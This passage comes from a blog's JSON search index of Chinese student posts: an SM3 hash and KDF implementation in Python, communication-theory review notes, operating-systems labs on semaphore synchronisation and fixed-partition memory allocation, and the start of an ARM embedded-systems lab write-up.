class=\"string\">'0'</span> + msg</span><br><span class=\"line\">    ml = int(len(msg) / <span class=\"number\">2</span>)</span><br><span class=\"line\">    msg_byte = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(ml):</span><br><span class=\"line\">        <span class=\"comment\"># print(msg[i*2:i*2+2])</span></span><br><span class=\"line\">        msg_byte.append(int(msg[i * <span class=\"number\">2</span>:i * <span class=\"number\">2</span> + <span class=\"number\">2</span>], <span class=\"number\">16</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> msg_byte</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># byte数组转换成16进制字符串</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">byte2hex</span><span class=\"params\">(msg)</span>:</span></span><br><span class=\"line\">    ml = len(msg)</span><br><span class=\"line\">    hexstr = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(ml):</span><br><span class=\"line\">        hexstr = hexstr + (<span class=\"string\">'%02x'</span> % msg[i])</span><br><span class=\"line\">    <span class=\"keyword\">return</span> hexstr</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Hash_sm3</span><span class=\"params\">(msg, Hexstr=<span class=\"number\">0</span>)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(Hexstr):</span><br><span class=\"line\">        msg_byte = hex2byte(msg)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        msg_byte = str2byte(msg)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> hash_msg(msg_byte)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">KDF</span><span class=\"params\">(Z,klen)</span>:</span> <span class=\"comment\"># Z为16进制表示的比特串（str），klen为密钥长度（单位byte）</span></span><br><span class=\"line\">    klen = int(klen)</span><br><span class=\"line\">    ct = <span class=\"number\">0x00000001</span></span><br><span class=\"line\">    <span class=\"comment\"># ceil为向上取整函数</span></span><br><span class=\"line\">    rcnt = ceil(klen / <span class=\"number\">32</span>)</span><br><span class=\"line\">    Zin = hex2byte(Z)</span><br><span class=\"line\">    Ha = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(rcnt):</span><br><span class=\"line\">        msg = Zin + hex2byte(<span class=\"string\">'%08x'</span> % ct)</span><br><span class=\"line\">        <span class=\"comment\"># print(msg)</span></span><br><span class=\"line\">        Ha = Ha + hash_msg(msg)</span><br><span class=\"line\">        <span class=\"comment\"># print(Ha)</span></span><br><span class=\"line\">        ct += <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> Ha[<span class=\"number\">0</span>: klen * <span class=\"number\">2</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    print(<span class=\"string\">'liushengwen'</span>)</span><br><span class=\"line\">    y = Hash_sm3(<span class=\"string\">'liushengwen'</span>)</span><br><span class=\"line\">    print(y)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># # klen = 19</span></span><br><span class=\"line\">    <span class=\"comment\"># # print(KDF(\"57E7B63623FAE5F08CDA468E872A20AFA03DED41BF1403770E040DC83AF31A67991F2B01EBF9EFD8881F0A0493000603\", klen))</span></span><br><span class=\"line\">    <span class=\"comment\">#</span></span><br><span class=\"line\">    <span class=\"comment\"># m = 'You are so beautiful'</span></span><br><span class=\"line\">    <span class=\"comment\"># m = hex2byte(m)</span></span><br><span class=\"line\">    <span class=\"comment\"># m = byte2hex(m)</span></span><br><span class=\"line\">    <span class=\"comment\"># print(m)</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"image-20200401190423849.png\" alt=\"image-20200401190423849\"></p>\n<h2 id=\"实验总结-3\"><a href=\"#实验总结-3\" class=\"headerlink\" title=\"实验总结\"></a>实验总结</h2><p>算法描述：</p>\n<ol>\n<li>填充对数据填充的目的是使数据在填充后长度的512的整数倍。</li>\n<li>迭代压缩处理</li>\n<li>消息扩展</li>\n<li>压缩函数（SM3安全的关键）</li>\n</ol>\n<h2 id=\"参考文献-1\"><a href=\"#参考文献-1\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ol>\n<li><a href=\"http://download.csdn.net/download/lict09/10131858\" target=\"_blank\" rel=\"noopener\">国密SM3算法及基于SM3的密钥派生函数KDF</a></li>\n<li><a href=\"http://download.csdn.net/download/lict09/10131863\" target=\"_blank\" rel=\"noopener\">python3实现的国密SM2</a></li>\n</ol>\n","categories":["技术"],"tags":["密码学"]},{"title":"通信原理复习整理","url":"https://littleghost2016.github.io/2017/12/29/通信原理复习整理/","content":"<h1 id=\"第一部分-概论\"><a href=\"#第一部分-概论\" class=\"headerlink\" title=\"第一部分-概论\"></a>第一部分-概论</h1><p>消息是信息的表现形式，信息是消息的内涵。消息的传输载体、电表示形式。</p>\n<p>信源-&gt;发送设备-&gt;信道(+噪声源)-&gt;接收设备-&gt;信宿。</p>\n<p>模拟信号-信号参量取值连续，数字信号-信号参量取值为有限个。</p>\n<p>半双工通信：通信双方都能收发消息，但不能同时。</p>\n<p>消息出现的概率越小，信息量就越大。</p>\n<p>等概率-&gt;I=log(2, 1/概率)&emsp;非等概率-&gt;次数加权求平均。</p>\n<p>不确定度越高(有序度越低)，信源熵值越高。</p>\n<p>通信系统的主要性能指标-有效性和可靠性。</p>\n<h1 id=\"第三部分-模拟信号\"><a href=\"#第三部分-模拟信号\" class=\"headerlink\" title=\"第三部分-模拟信号\"></a>第三部分-模拟信号</h1><p>NBFM的带宽约为调制信号带宽的2倍</p>\n<p>WBFM的载频fc=n2(n1*f1-f2)</p>\n<p>最大频偏deltaf=n1<em>n2</em>deltaf1</p>\n<p>调频指数mf=deltaf/fm</p>\n<p>输出信噪比=制度增益×输入信噪比(Si/(n0×B))</p>\n<p>AM/DSB–2fm</p>\n<p>SSB–fm</p>\n<p>VSB–略大于fm</p>\n<p>fm–2(mf+1)fm / 2(deltaf+fm)</p>\n<p>FM制度增益=3<em>mf*</em>2(mf+1)</p>\n<h1 id=\"第三部分-数字信号\"><a href=\"#第三部分-数字信号\" class=\"headerlink\" title=\"第三部分-数字信号\"></a>第三部分-数字信号</h1><p>数字化过程：抽样、量化、编码</p>\n<p>奈奎斯特抽样定理</p>\n<p>三种同步：载波同步、码元同步、群同步、网同步</p>\n<p>起止式同步：开始1</p>\n","categories":["技术"],"tags":["通信原理"]},{"title":"操作系统上机作业","url":"https://littleghost2016.github.io/2017/12/17/操作系统上机作业/","content":"<h1 id=\"实验一\"><a href=\"#实验一\" class=\"headerlink\" title=\"实验一\"></a>实验一</h1><h2 id=\"题干\"><a href=\"#题干\" class=\"headerlink\" title=\"题干\"></a>题干</h2><p>用两个进程来模拟汽车司机与售票员之间的协同关系：一方面只有售票员把车门关好了司机才能关门，因此，售票员管好车门应通知司机开车；另一方面，只有当汽车已经停下，售票员才能开门上下客，故司机停车后应通知售票员。汽车当前正在始发站停车上客，试设必要的信号量并赋初值，写出它们的同步过程。</p>\n<h2 id=\"实验目的\"><a href=\"#实验目的\" class=\"headerlink\" title=\"实验目的\"></a>实验目的</h2><p>通过使用信号量及有关的P、V操作，实现操作系统中一般的同步机制。</p>\n<h2 id=\"实验思路\"><a href=\"#实验思路\" class=\"headerlink\" title=\"实验思路\"></a>实验思路</h2><p>整体框架：一名司机和一名售票员各自是一个线程；</p>\n<p>两个信号量：S1—是否关车门可以发动公交车；S2—是否到站可以开车门；</p>\n<p>司 机：控制着汽车的到站停车[V(S2)]+售票员关门后通知司机可以发车启动[P(S1)]；</p>\n<p>售票员：司机到站停车后通知售票员可以开车门[P(S1)]+乘客上车后关车门[V(S2)]；</p>\n<p>说明：为了简化输出，假设每次上下车的人数符合常识，故没有设置相应变量表示人数的变化和上下车的实际动作。</p>\n<h2 id=\"实验结果\"><a href=\"#实验结果\" class=\"headerlink\" title=\"实验结果\"></a>实验结果</h2><p>通过实践反映出两个线程之间实现了同步</p>\n<p><img src=\"clip_image002.jpg\" alt=\"img\"></p>\n<p>当只有司机进程的时候，司机到站后S1信号量没有被售票员进行V操作，只有一直等待：</p>\n<p><img src=\"clip_image003.png\" alt=\"img\"></p>\n<p>当只有售票员进程的时候，售票员没有接到司机停车的信号（即S2信号没有置为1），只有一直等待到站：</p>\n<p><img src=\"clip_image004.png\" alt=\"img\"></p>\n<h2 id=\"源代码（Python3-6-2）\"><a href=\"#源代码（Python3-6-2）\" class=\"headerlink\" title=\"源代码（Python3.6.2）\"></a>源代码（Python3.6.2）</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 导入和线程、时间有关的包</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s1 = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"comment\"># 1：售票员通知司机可以开车，0：司机通知售票员不能开门</span></span><br><span class=\"line\">s2 = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"comment\"># 1：司机通知售票员可以开门，0：售票员通知司机不能开车</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Driver</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\">\t<span class=\"string\">\"\"\"司机类\"\"\"</span></span><br><span class=\"line\">\t<span class=\"comment\"># 司机执行的程序</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">drive</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\tself.v()</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\tself.p()</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 申请信号量s1</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">p</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> s1</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> s1 != <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">\t\ts1 -= <span class=\"number\">1</span></span><br><span class=\"line\">\t\tprint(<span class=\"string\">'&#123;&#125;  司 机-汽车启动！'</span>.format(time.ctime()))</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 释放信号量s2</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">v</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> s2</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> s2 != <span class=\"number\">0</span>:</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">\t\ts2 += <span class=\"number\">1</span></span><br><span class=\"line\">\t\tprint(<span class=\"string\">'&#123;&#125;  司 机-到站！'</span>.format(time.ctime()))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Conductor</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\">\t<span class=\"string\">\"\"\"售票员类\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sellTicket</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\t\t\tself.p()</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\tself.v()</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 申请信号量s2</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">p</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> s2</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> s2 != <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">\t\ts2 -= <span class=\"number\">1</span></span><br><span class=\"line\">\t\tprint(<span class=\"string\">'&#123;&#125;  售票员-开车门！'</span>.format(time.ctime()))</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 释放信号量s1</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">v</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">global</span> s1</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> s1 != <span class=\"number\">0</span>:</span><br><span class=\"line\">\t\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">\t\ttime.sleep(<span class=\"number\">0.5</span>)</span><br><span class=\"line\">\t\ts1 += <span class=\"number\">1</span></span><br><span class=\"line\">\t\tprint(<span class=\"string\">'&#123;&#125;  售票员-关车门！'</span>.format(time.ctime()))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">\t<span class=\"comment\"># 实例化司机类</span></span><br><span class=\"line\">\tdriver = Driver()</span><br><span class=\"line\">\t<span class=\"comment\"># 实例化售票员类</span></span><br><span class=\"line\">\tconductor = Conductor()</span><br><span class=\"line\">\t<span class=\"comment\"># 创建司机执行的线程</span></span><br><span class=\"line\">\tt1 = threading.Thread(target=driver.drive)</span><br><span class=\"line\">\t<span class=\"comment\"># 创建售票员执行的线程</span></span><br><span class=\"line\">\tt2 = threading.Thread(target=conductor.sellTicket)</span><br><span class=\"line\">\t<span class=\"comment\"># 线程启动</span></span><br><span class=\"line\">\tt1.start()</span><br><span class=\"line\">\tt2.start()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"实验二\"><a href=\"#实验二\" class=\"headerlink\" title=\"实验二\"></a>实验二</h1><h2 id=\"题干-1\"><a href=\"#题干-1\" class=\"headerlink\" title=\"题干\"></a>题干</h2><p>固定分区法就是把内存区固定地划分为若干个大小不等的区域。系统对内存的管理和控制通过数据结构—-分区说明表进行，分区说明表各分区号、分区大小、起始地址和是否是空闲区。内存的分配和释放、存储保护以及地址变换等都通过分区说明表进行。要求：模拟内存分区的分配与回收过程。</p>\n<h2 id=\"实验目的-1\"><a href=\"#实验目的-1\" class=\"headerlink\" title=\"实验目的\"></a>实验目的</h2><p>固定分区管理方式的主存分配回收模拟系统的设计。</p>\n<h2 id=\"实验思路-1\"><a href=\"#实验思路-1\" class=\"headerlink\" title=\"实验思路\"></a>实验思路</h2><ol>\n<li>初始化分区状态表，每个分区都包括唯一的序号(no)、分区大小(size)、起始地址(sa)、是否空闲的标志(flag)。</li>\n<li>假设有若干个需要分配的内存（大小有random包随机生成），对每个需要分配空间的任务分配一个线程，完成查找一个可存放空间的工作、分区使用结束后释放的工作。</li>\n<li>加入某一个或几个待分配的空间当前没有被分配，则将其所需空间加入到一个等待列表中等待下一次检查哪里可以分配，直到所有程序被分配且使用完释放后主程序结束。</li>\n</ol>\n<h2 id=\"实验结果-1\"><a href=\"#实验结果-1\" class=\"headerlink\" title=\"实验结果\"></a>实验结果</h2><p>此为共5个所需分配的任务</p>\n<p><img src=\"clip_image002-1585663704698.jpg\" alt=\"img\"></p>\n<h2 id=\"源代码（Python3-6-2）-1\"><a href=\"#源代码（Python3-6-2）-1\" class=\"headerlink\" title=\"源代码（Python3.6.2）\"></a>源代码（Python3.6.2）</h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 导入和线程、时间、随机数有关的包</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cumputer</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\">\t<span class=\"string\">\"\"\"docstring for Cumputer\"\"\"</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">\t\t<span class=\"comment\"># Partition status table--分区状态表</span></span><br><span class=\"line\">\t\tself.tablelist = []</span><br><span class=\"line\">\t\t<span class=\"comment\"># 包含要存放的分区的列表</span></span><br><span class=\"line\">\t\tself.runlist = []</span><br><span class=\"line\">\t\t<span class=\"comment\"># 包含暂时无法存放的分区的列表</span></span><br><span class=\"line\">\t\tself.waitlist = []</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 初始化分区状态表</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">inittablelist</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">\t\t<span class=\"comment\"># ordinary number--序号</span></span><br><span class=\"line\">\t\t<span class=\"comment\"># 特别说明：假设第一块为系统所用分区，不可用于分配空间</span></span><br><span class=\"line\">\t\ton = [<span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">5</span>, <span class=\"number\">6</span>, <span class=\"number\">7</span>, <span class=\"number\">8</span>, <span class=\"number\">9</span>]</span><br><span class=\"line\">\t\t<span class=\"comment\"># 各个分区的大小</span></span><br><span class=\"line\">\t\tsize = [<span class=\"number\">10</span>, <span class=\"number\">20</span>, <span class=\"number\">20</span>, <span class=\"number\">20</span>, <span class=\"number\">40</span>, <span class=\"number\">40</span>, <span class=\"number\">40</span>, <span class=\"number\">100</span>, <span class=\"number\">100</span>, <span class=\"number\">200</span>]</span><br><span class=\"line\">\t\t<span class=\"comment\"># start address--分区起始地址</span></span><br><span class=\"line\">\t\tsa = [<span class=\"number\">0</span>, <span class=\"number\">10</span>, <span class=\"number\">30</span>, <span class=\"number\">50</span>, <span class=\"number\">70</span>, <span class=\"number\">110</span>, <span class=\"number\">150</span>, <span class=\"number\">190</span>, <span class=\"number\">290</span>, <span class=\"number\">390</span>]</span><br><span class=\"line\">\t\t<span class=\"comment\"># 该分区是否可用的标志</span></span><br><span class=\"line\">\t\tflag = [<span class=\"literal\">False</span>, <span class=\"literal\">True</span>, <span class=\"literal\">True</span>, <span class=\"literal\">True</span>, <span class=\"literal\">True</span>, <span class=\"literal\">True</span>, <span class=\"literal\">True</span>, <span class=\"literal\">True</span>, <span class=\"literal\">True</span>, <span class=\"literal\">True</span>, ]</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\"># 将每个分区的属性写成分区表动态表</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> on:</span><br><span class=\"line\">\t\t\ttemp_dic = &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"string\">'on'</span>: i,</span><br><span class=\"line\">\t\t\t\t<span class=\"string\">'size'</span>: size[i],</span><br><span class=\"line\">\t\t\t\t<span class=\"string\">'sa'</span>: sa[i],</span><br><span class=\"line\">\t\t\t\t<span class=\"string\">'flag'</span>: flag[i],</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\tself.tablelist.append(temp_dic)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 主程序</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">running</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">\t\t<span class=\"comment\"># 首先初始化分区状态表</span></span><br><span class=\"line\">\t\tself.inittablelist()</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\"># 假设需要分配10个空间</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">5</span>):</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># 创建对应线程</span></span><br><span class=\"line\">\t\t\tself.runlist.append(threading.Thread(target=self.work, args=(random.randint(<span class=\"number\">1</span>, <span class=\"number\">20</span>) * <span class=\"number\">10</span>, )))</span><br><span class=\"line\">\t\t<span class=\"comment\"># 每个进程开始执行</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> self.runlist:</span><br><span class=\"line\">\t\t\ti.start()</span><br><span class=\"line\">\t\t<span class=\"comment\"># 所有进程执行后才继续主线程</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> self.runlist:</span><br><span class=\"line\">\t\t\ti.join()</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\"># 当等待分配列表里还有成员时一直循环</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">while</span> len(self.waitlist) != <span class=\"number\">0</span>:</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># 清空运行列表</span></span><br><span class=\"line\">\t\t\tself.runlist = []</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># 为等待列表里的成员创建线程和启动线程</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(self.waitlist)):</span><br><span class=\"line\">\t\t\t\tself.runlist.append(threading.Thread(target=self.work, args=(self.waitlist[<span class=\"number\">0</span>],)))</span><br><span class=\"line\">\t\t\t\tself.waitlist.pop(<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> self.runlist:</span><br><span class=\"line\">\t\t\t\ti.start()</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> self.runlist:</span><br><span class=\"line\">\t\t\t\ti.join()</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 线程函数</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">work</span><span class=\"params\">(self, given_size)</span>:</span></span><br><span class=\"line\">\t\t<span class=\"comment\"># result存放查找的结果</span></span><br><span class=\"line\">\t\tresult = self.find_a_place(given_size)</span><br><span class=\"line\">\t\t<span class=\"comment\"># 若找到一个可用的分区</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> result[<span class=\"number\">0</span>] == <span class=\"number\">1</span>:</span><br><span class=\"line\">\t\t\tprint(<span class=\"string\">'&#123;&#125;  &#123;&#125;工作已分配--&#123;&#125;'</span>.format(time.ctime(), given_size, self.tablelist[result[<span class=\"number\">1</span>]]))</span><br><span class=\"line\">\t\t<span class=\"comment\"># 若没有找到则将所需空间加入到等待列表</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t\tprint(<span class=\"string\">'&#123;&#125;  &#123;&#125;错误！没有空间存放！'</span>.format(time.ctime(), given_size))</span><br><span class=\"line\">\t\t\tself.waitlist.append(given_size)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\"># 模拟占用分区的时间</span></span><br><span class=\"line\">\t\ttime.sleep(random.randint(<span class=\"number\">2</span>, <span class=\"number\">4</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\"># 释放分区</span></span><br><span class=\"line\">\t\tself.release_the_place(result[<span class=\"number\">1</span>])</span><br><span class=\"line\">\t\tprint(<span class=\"string\">'&#123;&#125;  &#123;&#125;空间已释放！'</span>.format(time.ctime(), given_size))</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 查找有没有课分配的分区</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">find_a_place</span><span class=\"params\">(self, given_size)</span>:</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> self.tablelist:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">with</span> threading.Lock():</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\"># 查找比所需分区大且可以被使用的分区</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> given_size &lt;= i[<span class=\"string\">'size'</span>] <span class=\"keyword\">and</span> i[<span class=\"string\">'flag'</span>]:</span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\"># 更改标志表示已被使用</span></span><br><span class=\"line\">\t\t\t\t\ti[<span class=\"string\">'flag'</span>] = <span class=\"literal\">False</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"comment\"># 成功则返回1和序号</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">return</span> [<span class=\"number\">1</span>, i[<span class=\"string\">'on'</span>]]</span><br><span class=\"line\">\t\t<span class=\"comment\"># 失败则返回0和-1</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> [<span class=\"number\">0</span>, <span class=\"number\">-1</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 释放已占用的分区</span></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">release_the_place</span><span class=\"params\">(self, given_on)</span>:</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">with</span> threading.Lock():</span><br><span class=\"line\">\t\t\t<span class=\"comment\"># 更改标志后该分区又可被使用</span></span><br><span class=\"line\">\t\t\tself.tablelist[given_on][<span class=\"string\">'flag'</span>] = <span class=\"literal\">True</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">\t<span class=\"comment\"># 实例化计算机类并执行程序</span></span><br><span class=\"line\">\tcumputer = Cumputer()</span><br><span class=\"line\">\tcumputer.running()</span><br></pre></td></tr></table></figure>","categories":["技术"],"tags":["操作系统","python"]},{"title":"嵌入式系统上机作业","url":"https://littleghost2016.github.io/2017/12/03/嵌入式系统上机作业/","content":"<h1 id=\"一、实验平台\"><a href=\"#一、实验平台\" class=\"headerlink\" title=\"一、实验平台\"></a>一、实验平台</h1><h2 id=\"1-1平台简介\"><a href=\"#1-1平台简介\" class=\"headerlink\" title=\"1.1平台简介\"></a>1.1平台简介</h2><p>EMSBC2410 开发平台是一款基于 ARM9 的嵌入式开发实验平台，它基于三星公司的 ARM9 处理器 S3C2410A，它适用于设计工业控制、消费电子、移动手持设备类产品，具有高性能、低功耗、接口丰富、功能可剪裁、体积小等优良特性。EMSBC2410 平台外设丰富，包含串口、USB 主口、USB 从口、网卡、SD 卡、音频、键盘、液晶屏、触摸屏、JTAG 调试口、NORFLASH、Nandflash 存储系统、扩展IO口等资源。</p>\n<h2 id=\"1-2平台图示\"><a href=\"#1-2平台图示\" class=\"headerlink\" title=\"1.2平台图示\"></a>1.2平台图示</h2><p><img src=\"clip_image002.jpg\" alt=\"img\"></p>\n<h2 id=\"1-3元件布局\"><a href=\"#1-3元件布局\" class=\"headerlink\" title=\"1.3元件布局\"></a>1.3元件布局</h2><p><img src=\"clip_image004.jpg\" alt=\"img\"></p>\n<h2 id=\"1-4开发环境\"><a href=\"#1-4开发环境\" class=\"headerlink\" title=\"1.4开发环境\"></a>1.4开发环境</h2><p>Ø RealView MDK开发工具源自德国Keil公司，是ARM公司最新推出的针对各种嵌入式处理器的软件开发工具。</p>\n<p>q 包括Vision集成开发环境</p>\n<p>q RealView编译器</p>\n<p><img src=\"clip_image006.jpg\" alt=\"img\"></p>\n<h1 id=\"二、实验内容\"><a href=\"#二、实验内容\" class=\"headerlink\" title=\"二、实验内容\"></a>二、实验内容</h1><h2 id=\"1-ARM开发基础\"><a href=\"#1-ARM开发基础\" class=\"headerlink\" title=\"1.ARM开发基础\"></a>1.ARM开发基础</h2><h3 id=\"（1）实验目的\"><a href=\"#（1）实验目的\" class=\"headerlink\" title=\"（1）实验目的\"></a>（1）实验目的</h3><ul>\n<li>了解“EMSBC2410实验平台”的基本硬件组成;</li>\n<li>初步学会使用 μVision3 IDE for ARM 开发环境及ARM 软件模拟器;</li>\n<li>通过实验掌握简单 ARM 汇编指令的使用方法。</li>\n</ul>\n<h3 id=\"（2）实验内容\"><a href=\"#（2）实验内容\" class=\"headerlink\" 